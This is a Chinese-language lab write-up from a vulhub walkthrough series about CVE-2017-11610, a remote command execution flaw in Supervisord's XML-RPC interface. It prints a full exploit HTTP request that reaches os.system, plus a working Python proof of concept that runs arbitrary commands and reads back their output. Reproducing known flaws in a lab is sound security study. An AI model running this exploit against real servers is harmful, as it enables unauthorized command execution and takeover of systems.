

# Supervisord 远程命令执行漏洞（CVE-2017-11610）

###### by ADummy

### 0x00利用路线

​			Burpsuite发包--->命令执行--->exp直接打

### 0x01漏洞介绍

​		Supervisord是一款由Python语言开发，用于管理后台应用（服务）的工具，方便运维人员使用图形化界面进行管理。

近期，Supervisord曝出了一个需认证的远程命令执行漏洞（CVE-2017-11610），通过POST请求Supervisord管理界面恶意数据，可以获取服务器操作权限，存在严重的安全风险.

Supervisor介绍

Supervisor 是基于 Python 的进程管理工具，可以帮助我们更简单的启动、重启和停止服务器上的后台进程，是 Linux 服务器管理的效率工具。Supervisor有四个组件：

1. supervisord

运行Supervisor的后台服务，它用来启动和管理那些你需要Supervisor管理的子进程，响应客户端发来的请求，重启意外退出的子进程，将子进程的stdout和stderr写入日志，响应事件等。它是Supervisor最核心的部分。

2. supervisorctl

相当于supervisord的客户端，它是一个命令行工具，用户可以通过它向supervisord服务发指令，比如查看子进程状态，启动或关闭子进程。它可以连接不同的supervisord服务，包括远程机上的服务。

3. Web服务器

这是supervisord的Web客户端，用户可以在Web页面上完成类似于supervisorctl的功能。

4. XML-RPC接口

这是留给第三方集成的接口，你的服务可以在远程调用这些XML-RPC接口来控制supervisord管理的子进程。上面的Web服务器其实也是通过这个XML-RPC接口实现.
### 0x 02漏洞复现

环境启动后，访问`http://your-ip:9001`即可查看Supervisord的页面

![Supervisord _RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Supervisord_RCE_1.jpg)

直接执行任意命令：

```
POST /RPC2 HTTP/1.1
Host: localhost
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 213

<?xml version="1.0"?>
<methodCall>
<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
<params>
<param>
<string>touch /tmp/success</string>
</param>
</params>
</methodCall>
```

![Supervisord _RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Supervisord_RCE_2.jpg)

查看docker，/tmp/success 被成功创建

![Supervisord _RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Supervisord_RCE_3.jpg)

@Ricter 在微博上提出的一个思路，甚是有效，就是将命令执行的结果写入log文件中，再调用Supervisord自带的readLog方法读取log文件，将结果读出来。

写了个简单的POC： [poc.py](https://github.com/vulhub/vulhub/blob/master/supervisor/CVE-2017-11610/poc.py)，直接贴出来吧：

```python
#!/usr/bin/env python3
import xmlrpc.client
import sys


target = sys.argv[1]
command = sys.argv[2]
with xmlrpc.client.ServerProxy(target) as proxy:
    old = getattr(proxy, 'supervisor.readLog')(0,0)

    logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
    getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(command, logfile))
    result = getattr(proxy, 'supervisor.readLog')(0,0)

    print(result[len(old):])
```

使用Python3执行并获取结果：`./poc.py "http://your-ip:9001/RPC2" "command"`：

![Supervisord _RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Supervisord_RCE_4.jpg)

### 0x03参考资料

https://blog.csdn.net/zzkk_/article/details/77046789



